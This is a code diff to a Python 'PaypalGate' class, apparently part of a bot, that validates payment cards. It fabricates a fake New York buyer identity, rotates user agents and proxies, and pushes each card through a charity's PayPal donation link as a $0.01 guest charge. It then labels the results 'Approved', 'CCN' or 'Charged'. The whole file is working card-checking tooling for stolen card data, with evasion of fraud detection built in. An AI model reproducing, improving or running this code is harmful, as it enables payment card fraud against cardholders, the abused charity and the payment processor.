@@ -11,26 +11,32 @@ import uuid
 from urllib.parse import quote_plus
 from BOT.tools.proxy import get_proxy
 from faker import Faker
+from fake_useragent import UserAgent
 
 user_locks = {}
 
 
 class PaypalGate:
-    """Paypal $0.01 Charge Gate - Real Checking"""
+    """Paypal $0.01 Charge Gate - Real Checking (Original API)"""
     
     def __init__(self, proxy=None):
         self.s = requests.Session()
         self.proxy = proxy
         self.fake = Faker('en_US')
         
-        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
+        # Random user agent like original
+        try:
+            ua = UserAgent()
+            self.user_agent = ua.random
+        except:
+            self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
         
         # Apply proxy if provided
         if proxy:
             self.s.proxies = {'http': proxy, 'https': proxy}
     
     def check_card(self, cc, mm, yy, cvv):
-        """Full Paypal $0.01 charge check"""
+        """Full Paypal $0.01 charge check - Original API"""
         try:
             # Generate fake data
             first_name = self.fake.first_name()
@@ -41,26 +47,43 @@ class PaypalGate:
                 "10001", "10002", "10003", "10004", "10005", "10006", "10007", "10009", "10010",
                 "10011", "10012", "10013", "10014", "10016", "10017", "10018", "10019", "10020",
                 "10021", "10022", "10023", "10024", "10025", "10026", "10027", "10028", "10029",
-                "10030", "10031", "10032", "10033", "10034", "10035", "10036", "10037", "10038"
+                "10030", "10031", "10032", "10033", "10034", "10035", "10036", "10037", "10038",
+                "10039", "10040", "10044", "10065", "10069", "10075", "10128", "10280", "10282",
+                "10301", "10302", "10303", "10304", "10305", "10306", "10307", "10308", "10309",
+                "10310", "10312", "10314", "10451", "10452", "10453", "10454", "10455", "10456",
+                "10457", "10458", "10459", "10460", "10461", "10462", "10463", "10464", "10465",
+                "10466", "10467", "10468", "10469", "10470", "10471", "10472", "10473", "10474",
+                "10475", "11201", "11203", "11204", "11205", "11206", "11207", "11208", "11209",
+                "11210", "11211", "11212", "11213", "11214", "11215", "11216", "11217", "11218",
+                "11219", "11220", "11221", "11222", "11223", "11224", "11225", "11226", "11228",
+                "11229", "11230", "11231", "11232", "11233", "11234", "11235", "11236", "11237",
+                "11238", "11239", "11354", "11355", "11356", "11357", "11358", "11360", "11361",
+                "11362", "11363", "11364", "11365", "11366", "11367", "11368", "11369", "11370",
+                "11372", "11373", "11374", "11375", "11377", "11378", "11379", "11385", "11411",
+                "11412", "11413", "11414", "11415", "11416", "11417", "11418", "11419", "11420",
+                "11421", "11422", "11423", "11426", "11427", "11428", "11429", "11430", "11432",
+                "11433", "11434", "11435", "11436", "11691", "11692", "11693", "11694", "11697"
             ]
             postcode = random.choice(ny_postcodes)
             email = self.fake.email(domain='gmail.com')
             area_code = random.choice(['212', '347', '646', '718', '917', '929'])
-            phone = f"{area_code}{random.randint(1000000, 9999999)}"
+            phone = f"{random.randint(1000000, 9999999)}"
             
-            # Format card data
+            session_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
+            button_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
+            
+            # Card type detection - exact as original
             cc_type = "VISA" if cc.startswith('4') else "MASTER_CARD" if cc.startswith('5') else "DISCOVER" if cc.startswith('6') else "AMERICAN_EXPRESS" if cc.startswith('3') else "VISA"
             
             # Format month
-            if int(mm) < 10 and len(mm) == 1:
-                mm = f'0{mm}'
+            mm = mm.zfill(2)
             
             # Format year
             if len(yy) == 2:
                 yy = f'20{yy}'
             
             headers = {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'Connection': 'keep-alive',
                 'Upgrade-Insecure-Requests': '1',
                 'User-Agent': self.user_agent,
@@ -70,23 +93,28 @@ class PaypalGate:
             self.s.get('https://lpcenter.org/give/', headers=headers, timeout=30)
             
             # Step 2: Visit PayPal payment page
-            headers['referer'] = 'https://lpcenter.org/'
-            response = self.s.get('https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2', headers=headers, timeout=30)
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'referer': 'https://lpcenter.org/',
+                'upgrade-insecure-requests': '1',
+                'user-agent': self.user_agent,
+            }
             
-            # Extract CSRF token
+            response = self.s.get('https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2', headers=headers, timeout=30)
             csrf_token_match = re.search(r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']', response.text)
             if not csrf_token_match:
-                return "Declined ❌", "Failed to get CSRF token"
+                return "Declined ❌", "CSRF Error"
             csrf_token = csrf_token_match.group(1)
             
             # Step 3: Create order
-            headers.update({
+            headers = {
                 'accept': '*/*',
                 'content-type': 'application/json',
                 'origin': 'https://www.paypal.com',
                 'referer': 'https://www.paypal.com/ncp/payment/BKVC4EKUZY9K2',
+                'user-agent': self.user_agent,
                 'x-csrf-token': csrf_token,
-            })
+            }
             
             json_data = {
                 'link_id': 'BKVC4EKUZY9K2',
@@ -103,93 +131,36 @@ class PaypalGate:
             response = self.s.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data, timeout=30)
             order_data = response.json()
             
-            # Handle CSRF mismatch
+            # Handle CSRF mismatch - exact as original
             if order_data.get('message') == 'CSRF_MISMATCH_RETRY':
                 headers['x-csrf-token'] = order_data['csrfToken']
                 order_data = self.s.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data, timeout=30).json()
             
             if 'context_id' not in order_data:
-                return "Declined ❌", "Failed to create order"
+                return "Declined ❌", "Order Error"
             
             order_token = order_data['context_id']
             csrf_token = order_data.get('csrfToken', csrf_token)
             
-            session_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
-            button_id = f"uid_{uuid.uuid4().hex[:16]}_{uuid.uuid4().hex[:10]}"
-            
-            # Step 4: Pay with card
-            headers.update({
-                'accept-language': 'en-US,en;q=0.9',
+            # Step 4: Pay with card - exact headers as original
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
+                'content-type': 'application/json',
+                'origin': 'https://www.paypal.com',
                 'paypal-client-context': order_token,
                 'paypal-client-metadata-id': order_token,
                 'priority': 'u=1, i',
-                'referer': f'https://www.paypal.com/smart/card-fields?token={order_token}&sessionID={session_id}&buttonSessionID={button_id}&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US',
+                'referer': f'https://www.paypal.com/smart/card-fields?token={order_token}&sessionID={session_id}&buttonSessionID={button_id}&locale.x=es_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9WkRaV1ZDNFI0WENHUSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlzaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVzX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJmOEY5OEpiUUJhcUEvR3dVc2pub0JJQ2tkNURFODVhaDE2UjRWNHc5YWxxS3I1aXgiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
+                'user-agent': self.user_agent,
                 'x-app-name': 'standardcardfields',
                 'x-country': 'US',
                 'x-csrf-token': csrf_token,
-            })
+            }
             
+            # GraphQL mutation - exact as original
             json_data = {
-                'query': '''
-                    mutation payWithCard(
-                        $token: String!
-                        $card: CardInput
-                        $paymentToken: String
-                        $phoneNumber: String
-                        $firstName: String
-                        $lastName: String
-                        $shippingAddress: AddressInput
-                        $billingAddress: AddressInput
-                        $email: String
-                        $currencyConversionType: CheckoutCurrencyConversionType
-                        $installmentTerm: Int
-                        $identityDocument: IdentityDocumentInput
-                        $feeReferenceId: String
-                    ) {
-                        approveGuestPaymentWithCreditCard(
-                            token: $token
-                            card: $card
-                            paymentToken: $paymentToken
-                            phoneNumber: $phoneNumber
-                            firstName: $firstName
-                            lastName: $lastName
-                            email: $email
-                            shippingAddress: $shippingAddress
-                            billingAddress: $billingAddress
-                            currencyConversionType: $currencyConversionType
-                            installmentTerm: $installmentTerm
-                            identityDocument: $identityDocument
-                            feeReferenceId: $feeReferenceId
-                        ) {
-                            flags {
-                                is3DSecureRequired
-                            }
-                            cart {
-                                intent
-                                cartId
-                                buyer {
-                                    userId
-                                    auth {
-                                        accessToken
-                                    }
-                                }
-                                returnUrl {
-                                    href
-                                }
-                            }
-                            paymentContingencies {
-                                threeDomainSecure {
-                                    status
-                                    method
-                                    redirectUrl {
-                                        href
-                                    }
-                                    parameter
-                                }
-                            }
-                        }
-                    }
-                ''',
+                'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
                 'variables': {
                     'token': order_token,
                     'card': {
@@ -237,7 +208,7 @@ class PaypalGate:
             
             response_text = response.text
             
-            # Parse response
+            # Parse response - exact logic as original
             if 'VALIDATION_ERROR' in response_text:
                 jsonresponse = response.json()
                 message = jsonresponse['errors'][0]['message']
@@ -251,29 +222,15 @@ class PaypalGate:
                     code = 'NULL'
                 
                 if "INVALID_SECURITY_CODE" in code:
-                    return "CCN ✅", "CVC Mismatch"
+                    return "CCN ✅", "Invalid Security Code"
                 elif "OAS_VALIDATION_ERROR" in code:
                     return "Approved ✅", code
                 elif "EXISTING_ACCOUNT_RESTRICTED" in code:
                     return "Approved ✅", "Account Restricted"
                 elif "VALIDATION_ERROR" in code:
                     return "Approved ✅", code
-                elif "CARD_DECLINED" in code:
-                    return "Declined ❌", "Card Declined"
-                elif "INSUFFICIENT_FUNDS" in code:
-                    return "Approved ✅", "Insufficient Funds"
-                elif "DO_NOT_HONOR" in code:
-                    return "Approved ✅", "Do Not Honor"
-                elif "LOST_CARD" in code:
-                    return "Approved ✅", "Lost Card"
-                elif "STOLEN_CARD" in code:
-                    return "Approved ✅", "Stolen Card"
-                elif "EXPIRED_CARD" in code:
-                    return "Declined ❌", "Expired Card"
-                elif "INVALID_CARD_NUMBER" in code:
-                    return "Declined ❌", "Invalid Card Number"
                 else:
-                    return "Declined ❌", code[:40]
+                    return "Declined ❌", code[:40] if code != 'NULL' else 'Declined'
             
             elif 'is3DSecureRequired' in response_text:
                 jsonresponse = response.json()
@@ -282,7 +239,7 @@ class PaypalGate:
                                     .get('flags', {})
                                     .get('is3DSecureRequired', False))
                 
-                if is_3ds_required:
+                if is_3ds_required == True:
                     return "Approved ✅", "3D Secure Required"
                 else:
                     return "Charged 💎", "Charged $0.01"
